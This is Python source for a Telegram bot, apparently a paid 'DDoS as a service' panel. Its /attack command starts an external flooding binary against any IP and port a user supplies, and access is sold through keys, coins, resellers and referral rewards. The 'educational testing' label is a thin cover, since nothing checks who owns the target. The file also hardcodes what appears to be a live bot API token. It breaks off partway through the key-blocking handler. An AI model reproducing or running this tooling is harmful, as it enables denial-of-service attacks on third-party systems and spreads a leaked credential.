import telebot
import subprocess
import threading
import time
import json
import os
import sys
import random
from datetime import datetime, timedelta
import requests

# Bot setup
API_TOKEN = '8094930692:AAGy-bnpYA0A1j6B3lRWol-GyfK9gtiMwCo'
GROUP_USERNAME = 'DDOS_SERVER69'
OWNER_ID = '1866961136'
bot = telebot.TeleBot(API_TOKEN)

# Data storage file
DATA_FILE = 'bot_data.json'

# Save data to file
def save_data():
    with open(DATA_FILE, 'w') as f:
        json.dump(data, f, indent=4)

# Load or initialize data
if os.path.exists(DATA_FILE):
    with open(DATA_FILE, 'r') as f:
        data = json.load(f)
else:
    data = {
        'users': {},
        'keys': {},
        'banned': [],
        'tutorials': [],
        'logs': []
    }

# Auto-register owner as admin if not present
if OWNER_ID not in data['users']:
    data['users'][OWNER_ID] = {
        'type': 'admin',
        'plan': 'premium',
        'limit': 600,
        'expires': 0,
        'coins': 1000,
        'invited_by': None,
        'group_invites': 0
    }
    save_data()

# Coin prices for trial keys
COIN_PRICES = {
    '1h': 50,
    '1d': 100,
    '3d': 500,
    '7d': 700,
    '30d': 1500
}

# Global attack control and configuration
attacks = {}
BOT_CONFIG = {
    'attack_threads': 800,
    'packet_size': 512
}

# Helper function to add a log entry
def add_log(user_id, action):
    timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
    log_entry = f"[{timestamp}] User {user_id}: {action}"
    data['logs'].append(log_entry)
    if len(data['logs']) > 100:
        data['logs'] = data['logs'][-100:]
    save_data()

# Execute Rohan binary for attack
def run_attack(user_id, ip, port, duration, chat_id):
    try:
        packet_size = BOT_CONFIG['packet_size']
        threads = BOT_CONFIG['attack_threads']
        process = subprocess.Popen(['./Rohan', ip, str(port), str(duration), str(packet_size), str(threads)])
        attacks[user_id] = {'process': process, 'chat_id': chat_id}
        process.wait()
        attack_complete_msg = (
            "✅ Attack Completed ✅\n"
            "-----------------------------------\n"
            f"🎯 Target: {ip}:{port}\n"
            f"⏳ Duration: {duration} seconds\n"
            "-----------------------------------\n"
            "🏆 Result: Attack executed successfully!\n"
            "📲 Powered by @Rohan2349"
        )
        bot.send_message(chat_id, attack_complete_msg, parse_mode='MarkdownV2')
    except FileNotFoundError:
        bot.send_message(chat_id, "❌ Error: Rohan binary not found.")
    finally:
        if user_id in attacks:
            del attacks[user_id]

# /start
@bot.message_handler(commands=['start'])
def send_welcome(message):
    user_id = str(message.from_user.id)
    args = message.text.split()
    referrer_id = args[1][4:] if len(args) > 1 and args[1].startswith('ref_') else None

    if user_id in data['banned']:
        bot.reply_to(message, "🚫 Access Denied\nYou are banned from using this bot.", parse_mode='MarkdownV2')
        return
    if user_id not in data['users']:
        data['users'][user_id] = {
            'type': 'user', 'plan': 'free', 'limit': 0, 'expires': 0, 'coins': 0,
            'invited_by': referrer_id, 'group_invites': 0
        }
        if referrer_id and referrer_id in data['users'] and referrer_id != user_id and message.chat.type in ['group', 'supergroup']:
            referrer = data['users'][referrer_id]
            referrer['group_invites'] += 1
            referrer['coins'] += 10
            bot.send_message(referrer_id, f"🎉 Referral Bonus 🎉\nUser {user_id} joined via your invite!\n+10 coins added.", parse_mode='MarkdownV2')
        save_data()
    
    welcome_msg = (
        "🌟 Welcome to PAID DDoS Bot 🌟\n"
        "-----------------------------------\n"
        "⚙️ Purpose: Educational DDoS Testing\n"
        "👋 Get Started: Use /help for commands\n"
        "-----------------------------------\n"
        "📲 Powered by @Rohan2349"
    )
    bot.reply_to(message, welcome_msg, parse_mode='MarkdownV2')

# /help
@bot.message_handler(commands=['help'])
def send_help(message):
    user_id = str(message.from_user.id)
    if user_id in data['banned']:
        bot.reply_to(message, "🚫 Access Denied\nYou are banned.", parse_mode='MarkdownV2')
        return
    
    user_type = data['users'].get(user_id, {}).get('type', 'user')
    is_owner = user_id == OWNER_ID
    
    help_text = (
        "🌟 Rohan DDoS Bot - Command Center 🌟\n"
        "⚙️ Educational Tool for Testing Purposes Only ⚙️\n"
        "------------------------------------------------\n\n"
    )
    
    if user_type in ['user', 'reseller', 'admin'] or is_owner:
        help_text += (
            "👤 *User Commands* 👤\n"
            "✨ `/start` - Kick off your journey with the bot\n"
            "📊 `/myinfo` - View your account stats and limits\n"
            "💥 `/attack [IP] [PORT] [TIME]` - Launch a test attack\n"
            "   Ex: `/attack 127\\.0\\.0\\.1 8000 60`\n"
            "⛔ `/stop` - Halt your ongoing attack\n"
            "🔑 `/redeem [KEY]` - Activate a subscription key\n"
            "   Ex: `/redeem Rohan1234`\n"
            "📋 `/plan` - Check available subscription plans\n"
            "💰 `/coins` - See your coin balance\n"
            "🛒 `/buykey [DURATION]` - Purchase a trial key (200s limit)\n"
            "   Options: `1h`, `1d`, `3d`, `7d`, `30d`\n"
            "⬆️ `/spend [COINS]` - Boost attack limit with coins\n"
            "   Ex: `/spend 50` (10 coins = 20s, max 200s)\n"
            "📩 `/invite` - Get a referral link to earn coins\n"
            "🏆 `/leaderboard` - Top group inviters ranking\n"
            "🎥 `/tutorial` - Watch tutorial videos\n"
            "❓ `/help` - Display this command guide\n"
            "------------------------------------------------\n\n"
        )
    
    if user_type == 'reseller' or (user_type == 'admin' or is_owner):
        help_text += (
            "🔧 *Reseller Toolkit* 🔧\n"
            "🛠️ `/buykey [DURATION] [LIMIT]` - Craft a custom trial key\n"
            "   Ex: `/buykey 1d 300` (100-600s limit)\n"
            "------------------------------------------------\n\n"
        )
    
    if user_type == 'admin' or is_owner:
        help_text += (
            "🔒 *Admin Dashboard* 🔒\n"
            "🗝️ `/gen [KEY] [DURATION] [USES]` - Generate an access key\n"
            "   Ex: `/gen Rohan9999 1d 5`\n"
            "📜 `/allkey` - List all generated keys\n"
            "🚫 `/block [KEY]` - Disable an existing key\n"
            "   Ex: `/block Rohan1234`\n"
            "➕ `/add [TYPE] [USER_ID] [DURATION] [COINS]` - Add a user\n"
            "   Ex: `/add reseller 123456789 permanent 1000`\n"
            "➖ `/remove [USER_ID]` - Remove a user\n"
            "⛔ `/ban [USER_ID]` - Ban a user\n"
            "✅ `/unban [USER_ID]` - Unban a user\n"
            "👥 `/users` - List all registered users\n"
            "⏱️ `/limit [USER_ID] [SECONDS]` - Set attack duration limit\n"
            "   Ex: `/limit 123456789 600`\n"
            "📢 `/broadcast [MESSAGE]` - Announce to all users\n"
            "   Ex: `/broadcast Server maintenance at 3 PM`\n"
            "🔄 `/botupdate` - Check bot status and clean expired data\n"
            "🎬 `/addtutorial [VIDEO_LINK]` - Add a tutorial video\n"
            "   Ex: `/addtutorial https://youtu\\.be/3pZ\\-PCOxAXs\\?si=_E9HPyP7mARHusGV`\n"
            "📜 `/logs` - View recent bot activity logs\n"
            "🗑️ `/clearlogs` - Clear all log entries\n"
            "------------------------------------------------\n\n"
        )
    
    if is_owner:
        help_text += (
            "👑 *Owner Controls* 👑\n"
            "💻 `/terminal [SUBCOMMAND] [ARGS]` - Owner-only terminal\n"
            "   Ex: `/terminal set thread 1500`\n"
            "🛑 `/shutdown` - Stop the bot\n"
            "------------------------------------------------\n\n"
        )
    
    help_text += (
        "📌 *Pro Tip:* Commands are case-sensitive!\n"
        "📲 Contact @Rohan2349 for support or premium access\\.\n"
        "🔥 Happy testing!"
    )
    
    bot.reply_to(message, help_text, parse_mode='MarkdownV2')

# /invite
@bot.message_handler(commands=['invite'])
def send_invite(message):
    user_id = str(message.from_user.id)
    if user_id in data['banned']:
        bot.reply_to(message, "🚫 Access Denied\nYou are banned.", parse_mode='MarkdownV2')
        return
    if user_id not in data['users']:
        bot.reply_to(message, "⚠️ Register First\nUse /start to join the bot.", parse_mode='MarkdownV2')
        return
    
    group_link = f"t.me/{GROUP_USERNAME}?start=ref_{user_id}"
    invite_msg = (
        "📩 Your Invite Link 📩\n"
        "-----------------------------------\n"
        f"🔗 Link: {group_link}\n"
        "💰 Reward: Earn 10 coins per invite\n"
        "-----------------------------------\n"
        "📲 Share this to boost your coins!"
    )
    bot.reply_to(message, invite_msg, parse_mode='MarkdownV2')

# /leaderboard
@bot.message_handler(commands=['leaderboard'])
def show_leaderboard(message):
    user_id = str(message.from_user.id)
    if user_id in data['banned']:
        bot.reply_to(message, "🚫 Access Denied\nYou are banned.", parse_mode='MarkdownV2')
        return
    
    leaderboard = sorted(
        data['users'].items(),
        key=lambda x: (x[1]['group_invites'], x[1]['coins']),
        reverse=True
    )[:10]
    
    if not leaderboard:
        bot.reply_to(message, "🏆 Leaderboard 🏆\nNo inviters yet!", parse_mode='MarkdownV2')
        return
    
    leaderboard_msg = (
        "🏆 Leaderboard - Top Inviters 🏆\n"
        "-----------------------------------\n"
    )
    for i, (uid, user) in enumerate(leaderboard, 1):
        leaderboard_msg += f"{i}\\. ID: {uid}\n   📩 Invites: {user['group_invites']} | 💰 Coins: {user['coins']}\n"
    leaderboard_msg += "-----------------------------------\n📲 Powered by @Rohan2349"
    bot.reply_to(message, leaderboard_msg, parse_mode='MarkdownV2')

# /shutdown (Owner only)
@bot.message_handler(commands=['shutdown'])
def shutdown_bot(message):
    user_id = str(message.from_user.id)
    if user_id != OWNER_ID:
        bot.reply_to(message, "🔒 Permission Denied\nOnly the owner can shut down the bot.", parse_mode='MarkdownV2')
        return
    
    shutdown_msg = (
        "🛑 Shutting Down 🛑\n"
        "-----------------------------------\n"
        "⚙️ Status: Bot is stopping...\n"
        "-----------------------------------\n"
        "📲 Powered by @Rohan2349"
    )
    bot.reply_to(message, shutdown_msg, parse_mode='MarkdownV2')
    save_data()
    bot.stop_polling()
    sys.exit(0)

# /myinfo
@bot.message_handler(commands=['myinfo'])
def my_info(message):
    user_id = str(message.from_user.id)
    if user_id in data['banned']:
        bot.reply_to(message, "🚫 Access Denied\nYou are banned.", parse_mode='MarkdownV2')
        return
    if user_id not in data['users']:
        data['users'][user_id] = {'type': 'user', 'plan': 'free', 'limit': 0, 'expires': 0, 'coins': 0, 'invited_by': None, 'group_invites': 0}
        save_data()
    
    user = data['users'][user_id]
    expires = "Never" if user['expires'] == 0 else datetime.fromtimestamp(user['expires']).strftime('%Y-%m-%d %H:%M:%S')
    myinfo_msg = (
        "📊 Your Account Info 📊\n"
        "-----------------------------------\n"
        f"🆔 ID: {user_id}\n"
        f"👤 Type: {user['type']}\n"
        f"📋 Plan: {user['plan']}\n"
        f"⏱️ Attack Limit: {user['limit']}s\n"
        f"⌛ Expires: {expires}\n"
        f"💰 Coins: {user['coins']}\n"
        f"📩 Group Invites: {user['group_invites']}\n"
        "-----------------------------------\n"
        "📲 Powered by @Rohan2349"
    )
    bot.reply_to(message, myinfo_msg, parse_mode='MarkdownV2')

# /coins
@bot.message_handler(commands=['coins'])
def check_coins(message):
    user_id = str(message.from_user.id)
    if user_id in data['banned']:
        bot.reply_to(message, "🚫 Access Denied\nYou are banned.", parse_mode='MarkdownV2')
        return
    if user_id not in data['users']:
        data['users'][user_id] = {'type': 'user', 'plan': 'free', 'limit': 0, 'expires': 0, 'coins': 0, 'invited_by': None, 'group_invites': 0}
        save_data()
    
    coins = data['users'][user_id]['coins']
    coins_msg = (
        "💰 Coin Balance 💰\n"
        "-----------------------------------\n"
        f"📈 Total Coins: {coins}\n"
        "-----------------------------------\n"
        "📲 Use /spend or /buykey to utilize them!"
    )
    bot.reply_to(message, coins_msg, parse_mode='MarkdownV2')

# /buykey [DURATION] [LIMIT] (for resellers)
@bot.message_handler(commands=['buykey'])
def buy_key(message):
    user_id = str(message.from_user.id)
    if user_id in data['banned']:
        bot.reply_to(message, "🚫 Access Denied\nYou are banned.", parse_mode='MarkdownV2')
        return
    if user_id not in data['users']:
        bot.reply_to(message, "⚠️ Register First\nUse /start to join the bot.", parse_mode='MarkdownV2')
        return
    
    args = message.text.split()
    is_reseller = data['users'][user_id]['type'] == 'reseller'
    
    if is_reseller and len(args) != 3:
        bot.reply_to(message, "📋 Usage for Resellers\n`/buykey [DURATION] [LIMIT]`\nEx: `/buykey 1d 300`\nOptions: `1h`, `1d`, `3d`, `7d`, `30d` | Limit: 100-600s", parse_mode='MarkdownV2')
        return
    elif not is_reseller and len(args) != 2:
        bot.reply_to(message, "📋 Usage for Users\n`/buykey [DURATION]`\nEx: `/buykey 1d`\nOptions: `1h`, `1d`, `3d`, `7d`, `30d`", parse_mode='MarkdownV2')
        return
    
    duration_str = args[1]
    if duration_str not in COIN_PRICES:
        bot.reply_to(message, "❌ Invalid Duration\nOptions: `1h`, `1d`, `3d`, `7d`, `30d`", parse_mode='MarkdownV2')
        return
    
    user = data['users'][user_id]
    if is_reseller:
        try:
            attack_limit = int(args[2])
            if attack_limit < 100 or attack_limit > 600:
                bot.reply_to(message, "❌ Invalid Limit\nAttack limit must be between 100 and 600 seconds.", parse_mode='MarkdownV2')
                return
            base_cost = COIN_PRICES[duration_str]
            extra_cost = (attack_limit - 100) // 5
            cost = base_cost + extra_cost
        except ValueError:
            bot.reply_to(message, "❌ Invalid Input\nLimit must be an integer between 100 and 600.", parse_mode='MarkdownV2')
            return
    else:
        cost = COIN_PRICES[duration_str]
        attack_limit = 200
    
    if user['coins'] < cost:
        bot.reply_to(message, f"💸 Insufficient Funds\nYou need {cost} coins, but you have {user['coins']}.", parse_mode='MarkdownV2')
        return
    
    key_code = f"Rohan{random.randint(1000, 9999)}"
    duration = {'1h': 3600, '1d': 86400, '3d': 259200, '7d': 604800, '30d': 2592000}[duration_str]
    data['keys'][key_code] = {
        'duration': duration,
        'uses': 1,
        'active': True,
        'created': time.time(),
        'coin_purchased': True,
        'attack_limit': attack_limit
    }
    user['coins'] -= cost
    add_log(user_id, f"Purchased key {key_code} for {duration_str} with {attack_limit}s limit")
    save_data()
    
    buykey_msg = (
        "🛒 Key Purchased 🛒\n"
        "-----------------------------------\n"
        f"🔑 Key: {key_code}\n"
        f"⏳ Duration: {duration_str}\n"
        f"⏱️ Attack Limit: {attack_limit}s\n"
        f"💰 Cost: {cost} coins\n"
        "-----------------------------------\n"
    )
    if is_reseller:
        buykey_msg += "📤 Share this key with users to redeem!"
    else:
        buykey_msg += f"✅ Use `/redeem {key_code}` to activate!"
    bot.reply_to(message, buykey_msg, parse_mode='MarkdownV2')

# /attack [IP] [PORT] [TIME]
@bot.message_handler(commands=['attack'])
def start_attack(message):
    user_id = str(message.from_user.id)
    chat_id = message.chat.id
    if user_id in data['banned']:
        bot.reply_to(message, "🚫 Access Denied\nYou are banned.", parse_mode='MarkdownV2')
        return
    if user_id not in data['users']:
        bot.reply_to(message, "⚠️ Register First\nUse /start to join the bot.", parse_mode='MarkdownV2')
        return
    user = data['users'][user_id]
    if user['plan'] == 'free':
        bot.reply_to(message, "📩 Upgrade Required\nDm @Rohan2349 to buy access.", parse_mode='MarkdownV2')
        return
    if user_id in attacks:
        bot.reply_to(message, "⚠️ Attack in Progress\nUse /stop to halt it first.", parse_mode='MarkdownV2')
        return
    args = message.text.split()
    if len(args) != 4:
        bot.reply_to(message, "📋 Usage\n`/attack [IP] [PORT] [TIME]`\nEx: `/attack 127\\.0\\.0\\.1 8000 60`", parse_mode='MarkdownV2')
        return
    target_ip, target_port, time_str = args[1], args[2], args[3]
    try:
        duration = int(time_str)
        port = int(target_port)
        if duration > user['limit']:
            bot.reply_to(message, f"⏱️ Limit Exceeded\nMax duration is {user['limit']} seconds.", parse_mode='MarkdownV2')
            return
        if user['expires'] and time.time() > user['expires']:
            bot.reply_to(message, "⌛ Plan Expired\nRenew your subscription.", parse_mode='MarkdownV2')
            return
        
        packet_size = BOT_CONFIG['packet_size']
        thread_count = BOT_CONFIG['attack_threads']
        
        attack_start_msg = (
            "💥 Attack Launched 💥\n"
            "-----------------------------------\n"
            f"🎯 Target: {target_ip}:{port}\n"
            f"⏳ Duration: {duration} seconds\n"
            f"⚡ Threads: {thread_count}\n"
            f"📦 Packet Size: {packet_size} bytes\n"
            "-----------------------------------\n"
            "🔥 Status: Attack in progress...\n"
            "📲 Powered by @Rohan2349"
        )
        bot.reply_to(message, attack_start_msg, parse_mode='MarkdownV2')
        
        add_log(user_id, f"Started attack on {target_ip}:{port} for {duration}s")
        attack_thread = threading.Thread(target=run_attack, args=(user_id, target_ip, target_port, duration, chat_id))
        attack_thread.start()
        
    except ValueError:
        bot.reply_to(message, "❌ Invalid Input\nPort and time must be integers.", parse_mode='MarkdownV2')

# /stop
@bot.message_handler(commands=['stop'])
def stop_attack(message):
    user_id = str(message.from_user.id)
    if user_id not in attacks:
        bot.reply_to(message, "⚠️ No Attack Running\nNothing to stop.", parse_mode='MarkdownV2')
        return
    
    attacks[user_id]['process'].terminate()
    del attacks[user_id]
    stop_msg = (
        "⛔ Attack Stopped ⛔\n"
        "-----------------------------------\n"
        "✅ Status: Attack terminated successfully\n"
        "-----------------------------------\n"
        "📲 Powered by @Rohan2349"
    )
    bot.reply_to(message, stop_msg, parse_mode='MarkdownV2')
    add_log(user_id, "Stopped an ongoing attack")

# /redeem [KEY]
@bot.message_handler(commands=['redeem'])
def redeem_key(message):
    user_id = str(message.from_user.id)
    if user_id in data['banned']:
        bot.reply_to(message, "🚫 Access Denied\nYou are banned.", parse_mode='MarkdownV2')
        return
    args = message.text.split()
    if len(args) != 2:
        bot.reply_to(message, "📋 Usage\n`/redeem [KEY]`\nEx: `/redeem Rohan1234`", parse_mode='MarkdownV2')
        return
    key = args[1]
    if key not in data['keys'] or not data['keys'][key]['active'] or data['keys'][key]['uses'] <= 0:
        bot.reply_to(message, "❌ Invalid Key\nKey is expired or invalid.", parse_mode='MarkdownV2')
        return
    
    key_data = data['keys'][key]
    limit = key_data.get('attack_limit', 600)
    data['users'][user_id] = {
        'type': 'user',
        'plan': 'premium',
        'limit': limit,
        'expires': time.time() + key_data['duration'] if key_data['duration'] != 0 else 0,
        'coins': data['users'][user_id].get('coins', 0),
        'invited_by': data['users'][user_id].get('invited_by', None),
        'group_invites': data['users'][user_id].get('group_invites', 0)
    }
    data['keys'][key]['uses'] -= 1
    if data['keys'][key]['uses'] == 0:
        data['keys'][key]['active'] = False
    add_log(user_id, f"Redeemed key {key} with {limit}s limit")
    save_data()
    
    redeem_msg = (
        "🔑 Key Redeemed 🔑\n"
        "-----------------------------------\n"
        "✅ Status: Premium access granted\n"
        f"⏱️ Attack Limit: {limit}s\n"
        "-----------------------------------\n"
        "📲 Powered by @Rohan2349"
    )
    bot.reply_to(message, redeem_msg, parse_mode='MarkdownV2')

# /plan
@bot.message_handler(commands=['plan'])
def show_plans(message):
    plans_msg = (
        "📋 Subscription Plans 📋\n"
        "-----------------------------------\n"
        "🆓 Free:  0s attack limit\n"
        "🌟 Premium: Up to 600s attack limit\n"
        "🛒 Trial Keys (via `/buykey`):\n"
        "   ⏳ 1h = 50 coins\n"
        "   ⏳ 1d = 100 coins\n"
        "   ⏳ 3d = 500 coins\n"
        "   ⏳ 7d = 700 coins\n"
        "   ⏳ 30d = 1500 coins\n"
        "🔧 Resellers: Custom limits (100-600s)\n"
        "-----------------------------------\n"
        "📲 Contact @Rohan2349 for more info"
    )
    bot.reply_to(message, plans_msg, parse_mode='MarkdownV2')

# /spend [COINS]
@bot.message_handler(commands=['spend'])
def spend_coins(message):
    user_id = str(message.from_user.id)
    if user_id in data['banned']:
        bot.reply_to(message, "🚫 Access Denied\nYou are banned.", parse_mode='MarkdownV2')
        return
    if user_id not in data['users']:
        bot.reply_to(message, "⚠️ Register First\nUse /start to join the bot.", parse_mode='MarkdownV2')
        return
    
    args = message.text.split()
    if len(args) != 2:
        bot.reply_to(message, "📋 Usage\n`/spend [COINS]`\nEx: `/spend 50`\n10 coins = 20s extra (max 200s)", parse_mode='MarkdownV2')
        return
    
    try:
        coins_to_spend = int(args[1])
        if coins_to_spend <= 0:
            bot.reply_to(message, "❌ Invalid Amount\nUse a positive number.", parse_mode='MarkdownV2')
            return
        
        user = data['users'][user_id]
        if coins_to_spend > user['coins']:
            bot.reply_to(message, f"💸 Insufficient Funds\nYou have {user['coins']} coins.", parse_mode='MarkdownV2')
            return
        
        extra_seconds = (coins_to_spend // 10) * 20
        new_limit = min(user['limit'] + extra_seconds, 200)
        if new_limit == user['limit']:
            bot.reply_to(message, "⚠️ Max Limit Reached\nYour attack limit is already 200s.", parse_mode='MarkdownV2')
            return
        
        user['coins'] -= coins_to_spend
        user['limit'] = new_limit
        add_log(user_id, f"Spent {coins_to_spend} coins to increase limit to {new_limit}s")
        save_data()
        
        spend_msg = (
            "⬆️ Limit Upgraded ⬆️\n"
            "-----------------------------------\n"
            f"💰 Coins Spent: {coins_to_spend}\n"
            f"⏱️ New Limit: {new_limit}s\n"
            "-----------------------------------\n"
            "📲 Powered by @Rohan2349"
        )
        bot.reply_to(message, spend_msg, parse_mode='MarkdownV2')
    
    except ValueError:
        bot.reply_to(message, "❌ Invalid Input\nUse a positive integer.", parse_mode='MarkdownV2')

# Admin/Reseller Commands
def is_admin_or_reseller(user_id):
    return str(user_id) in data['users'] and data['users'][str(user_id)]['type'] in ['admin', 'reseller']

def is_admin(user_id):
    return str(user_id) in data['users'] and data['users'][str(user_id)]['type'] == 'admin'

# /gen [KEY] [DURATION] [USES]
@bot.message_handler(commands=['gen'])
def generate_key(message):
    user_id = str(message.from_user.id)
    if not is_admin(user_id):
        bot.reply_to(message, "🔒 Permission Denied\nAdmin only.", parse_mode='MarkdownV2')
        return
    args = message.text.split()
    if len(args) != 4:
        bot.reply_to(message, "📋 Usage\n`/gen [KEY] [DURATION] [USES]`\nEx: `/gen Rohan9999 1d 5`", parse_mode='MarkdownV2')
        return
    
    key = args[1]
    if not key.startswith("Rohan") or len(key) != 9 or not key[5:].isdigit():
        key = f"Rohan{random.randint(1000, 9999)}"
    duration_str, uses = args[2], int(args[3])
    duration = 0 if duration_str == 'permanent' else int(duration_str[:-1]) * (86400 if duration_str.endswith('d') else 3600 if duration_str.endswith('h') else 1)
    data['keys'][key] = {'duration': duration, 'uses': uses, 'active': True, 'created': time.time()}
    add_log(user_id, f"Generated key {key} with {duration}s duration and {uses} uses")
    save_data()
    
    gen_msg = (
        "🗝️ Key Generated 🗝️\n"
        "-----------------------------------\n"
        f"🔑 Key: {key}\n"
        f"⏳ Duration: {duration}s\n"
        f"🔄 Uses: {uses}\n"
        "-----------------------------------\n"
        "📲 Powered by @Rohan2349"
    )
    bot.reply_to(message, gen_msg, parse_mode='MarkdownV2')

# /add [TYPE] [USER_ID] [DURATION] [COINS]
@bot.message_handler(commands=['add'])
def add_user(message):
    user_id = str(message.from_user.id)
    if not is_admin(user_id):
        bot.reply_to(message, "🔒 Permission Denied\nAdmin only.", parse_mode='MarkdownV2')
        return
    args = message.text.split()
    if len(args) < 4 or len(args) > 5:
        bot.reply_to(message, "📋 Usage\n`/add [TYPE] [USER_ID] [DURATION] [COINS (optional)]`\nEx: `/add reseller 123456789 permanent 1000`", parse_mode='MarkdownV2')
        return
    
    type_, target_user_id, duration_str = args[1], args[2], args[3]
    initial_coins = int(args[4]) if len(args) == 5 else 500
    
    if type_ not in ['user', 'admin', 'reseller']:
        bot.reply_to(message, "❌ Invalid Type\nMust be `user`, `admin`, or `reseller`.", parse_mode='MarkdownV2')
        return
    if initial_coins < 0:
        bot.reply_to(message, "❌ Invalid Coins\nMust be a positive number.", parse_mode='MarkdownV2')
        return
    
    duration = 0 if duration_str == 'permanent' else int(duration_str[:-1]) * (86400 if duration_str.endswith('d') else 3600 if duration_str.endswith('h') else 1)
    data['users'][target_user_id] = {
        'type': type_,
        'plan': 'premium' if type_ in ['admin', 'reseller'] else 'free',
        'limit': 600 if type_ in ['admin', 'reseller'] else 0,
        'expires': time.time() + duration if duration else 0,
        'coins': initial_coins,
        'invited_by': None,
        'group_invites': 0
    }
    add_log(user_id, f"Added {type_} {target_user_id} with {duration_str} duration and {initial_coins} coins")
    save_data()
    
    add_msg = (
        "➕ User Added ➕\n"
        "-----------------------------------\n"
        f"👤 Type: {type_}\n"
        f"🆔 ID: {target_user_id}\n"
        f"⏳ Duration: {duration_str}\n"
        f"💰 Initial Coins: {initial_coins}\n"
        "-----------------------------------\n"
        "📲 Powered by @Rohan2349"
    )
    bot.reply_to(message, add_msg, parse_mode='MarkdownV2')

# /users
@bot.message_handler(commands=['users'])
def list_users(message):
    user_id = str(message.from_user.id)
    if not is_admin(user_id):
        bot.reply_to(message, "🔒 Permission Denied\nAdmin only.", parse_mode='MarkdownV2')
        return
    
    if not data['users']:
        bot.reply_to(message, "👥 User List 👥\nNo users registered yet.", parse_mode='MarkdownV2')
        return
    
    users_msg = (
        "👥 Registered Users 👥\n"
        "-----------------------------------\n"
    )
    for uid, user in data['users'].items():
        expires = "Never" if user['expires'] == 0 else datetime.fromtimestamp(user['expires']).strftime('%Y-%m-%d %H:%M:%S')
        users_msg += (
            f"🆔 ID: {uid}\n"
            f"👤 Type: {user['type']}\n"
            f"📋 Plan: {user['plan']}\n"
            f"⏱️ Limit: {user['limit']}s\n"
            f"⌛ Expires: {expires}\n"
            f"💰 Coins: {user['coins']}\n"
            f"📩 Invites: {user['group_invites']}\n\n"
        )
    users_msg += "-----------------------------------\n📲 Powered by @Rohan2349"
    bot.reply_to(message, users_msg, parse_mode='MarkdownV2')

# /limit
@bot.message_handler(commands=['limit'])
def set_limit(message):
    user_id = str(message.from_user.id)
    if not is_admin(user_id):
        bot.reply_to(message, "🔒 Permission Denied\nAdmin only.", parse_mode='MarkdownV2')
        return
    args = message.text.split()
    if len(args) != 3:
        bot.reply_to(message, "📋 Usage\n`/limit [USER_ID] [SECONDS]`\nEx: `/limit 123456789 600`", parse_mode='MarkdownV2')
        return
    
    target_user_id, limit = args[1], args[2]
    try:
        limit = int(limit)
        if limit < 0:
            bot.reply_to(message, "❌ Invalid Limit\nMust be non-negative.", parse_mode='MarkdownV2')
            return
        if target_user_id not in data['users']:
            bot.reply_to(message, f"❌ User Not Found\nID {target_user_id} is not registered.", parse_mode='MarkdownV2')
            return
        data['users'][target_user_id]['limit'] = limit
        add_log(user_id, f"Set attack limit for {target_user_id} to {limit}s")
        save_data()
        
        limit_msg = (
            "⏱️ Limit Updated ⏱️\n"
            "-----------------------------------\n"
            f"🆔 User ID: {target_user_id}\n"
            f"⏳ New Limit: {limit} seconds\n"
            "-----------------------------------\n"
            "📲 Powered by @Rohan2349"
        )
        bot.reply_to(message, limit_msg, parse_mode='MarkdownV2')
    except ValueError:
        bot.reply_to(message, "❌ Invalid Input\nLimit must be a number.", parse_mode='MarkdownV2')

# /ban
@bot.message_handler(commands=['ban'])
def ban_user(message):
    user_id = str(message.from_user.id)
    if not is_admin(user_id):
        bot.reply_to(message, "🔒 Permission Denied\nAdmin only.", parse_mode='MarkdownV2')
        return
    args = message.text.split()
    if len(args) != 2:
        bot.reply_to(message, "📋 Usage\n`/ban [USER_ID]`\nEx: `/ban 123456789`", parse_mode='MarkdownV2')
        return
    
    target_user_id = args[1]
    if target_user_id not in data['users']:
        bot.reply_to(message, f"❌ User Not Found\nID {target_user_id} is not registered.", parse_mode='MarkdownV2')
        return
    if target_user_id in data['banned']:
        bot.reply_to(message, f"⚠️ Already Banned\nUser {target_user_id} is already banned.", parse_mode='MarkdownV2')
        return
    
    data['banned'].append(target_user_id)
    add_log(user_id, f"Banned user {target_user_id}")
    save_data()
    
    ban_msg = (
        "⛔ User Banned ⛔\n"
        "-----------------------------------\n"
        f"🆔 User ID: {target_user_id}\n"
        "✅ Status: Successfully banned\n"
        "-----------------------------------\n"
        "📲 Powered by @Rohan2349"
    )
    bot.reply_to(message, ban_msg, parse_mode='MarkdownV2')

# /unban
@bot.message_handler(commands=['unban'])
def unban_user(message):
    user_id = str(message.from_user.id)
    if not is_admin(user_id):
        bot.reply_to(message, "🔒 Permission Denied\nAdmin only.", parse_mode='MarkdownV2')
        return
    args = message.text.split()
    if len(args) != 2:
        bot.reply_to(message, "📋 Usage\n`/unban [USER_ID]`\nEx: `/unban 123456789`", parse_mode='MarkdownV2')
        return
    
    target_user_id = args[1]
    if target_user_id not in data['banned']:
        bot.reply_to(message, f"⚠️ Not Banned\nUser {target_user_id} is not banned.", parse_mode='MarkdownV2')
        return
    
    data['banned'].remove(target_user_id)
    add_log(user_id, f"Unbanned user {target_user_id}")
    save_data()
    
    unban_msg = (
        "✅ User Unbanned ✅\n"
        "-----------------------------------\n"
        f"🆔 User ID: {target_user_id}\n"
        "✅ Status: Successfully unbanned\n"
        "-----------------------------------\n"
        "📲 Powered by @Rohan2349"
    )
    bot.reply_to(message, unban_msg, parse_mode='MarkdownV2')

# /allkey
@bot.message_handler(commands=['allkey'])
def list_keys(message):
    user_id = str(message.from_user.id)
    if not is_admin(user_id):
        bot.reply_to(message, "🔒 Permission Denied\nAdmin only.", parse_mode='MarkdownV2')
        return
    
    if not data['keys']:
        bot.reply_to(message, "🔑 Key List 🔑\nNo keys generated yet.", parse_mode='MarkdownV2')
        return
    
    keys_msg = (
        "🔑 Generated Keys 🔑\n"
        "-----------------------------------\n"
    )
    for key, key_data in data['keys'].items():
        duration = "Permanent" if key_data['duration'] == 0 else f"{key_data['duration']}s"
        keys_msg += (
            f"🔑 Key: {key}\n"
            f"⏳ Duration: {duration}\n"
            f"🔄 Uses Remaining: {key_data['uses']}\n"
            f"✅ Active: {key_data['active']}\n"
            f"⏱️ Attack Limit: {key_data.get('attack_limit', 'N/A')}s\n\n"
        )
    keys_msg += "-----------------------------------\n📲 Powered by @Rohan2349"
    bot.reply_to(message, keys_msg, parse_mode='MarkdownV2')

# /block
@bot.message_handler(commands=['block'])
def block_key(message):
    user_id = str(message.from_user.id)
    if not is_admin(user_id):
        bot.reply_to(message, "🔒 Permission Denied\nAdmin only.", parse_mode='MarkdownV2')
        return
    args = message.text.split()
    if len(args) != 2:
        bot.reply_to(message, "📋 Usage\n`/block [KEY]`\nEx: `/block Rohan1234`", parse_mode='MarkdownV2')
        return
    
    key = args[1]
    if key not in data['keys']:
